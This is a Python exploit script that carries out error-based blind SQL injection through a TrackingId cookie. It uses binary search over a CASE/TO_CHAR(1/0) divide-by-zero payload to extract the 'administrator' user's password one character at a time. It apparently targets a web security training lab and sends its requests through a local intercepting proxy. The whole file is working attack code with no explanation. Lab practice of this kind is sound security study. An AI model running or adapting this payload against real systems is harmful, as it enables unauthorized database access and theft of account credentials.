#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ''
    for i in range(1, 21):
        st = 32
        ed = 126
        while st < ed:
            mid = (st + ed) // 2
            sqli_payload = \
                "'union select CASE WHEN (not ascii(substr(password, %s, 1)) > %s) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator'--" % (i, mid)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'HwR22PsEvLp6H4Gn' \
                       + sqli_payload_encoded,
                       'session': 'NCS5EUWGP5eKe43dOwzL3qBbo5Hon4ZD'}
            r = requests.get(url, cookies=cookies, verify=False,
                             proxies=proxies)
            if 'Internal Server Error' in r.text:
                ed = mid
                sys.stdout.write('\r' + password_extracted + chr(mid))
                sys.stdout.flush()
            else:
                st = mid + 1
                sys.stdout.write('\r' + password_extracted + chr(mid))
                sys.stdout.flush()
        password_extracted += chr(ed)
        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s <url>' % sys.argv[0])
        print('(+) Example: %s www.example.com' % sys.argv[0])

    url = sys.argv[1]
    print('(+) Retrieving administrator password...')
    sqli_password(url)


if __name__ == '__main__':
    main()
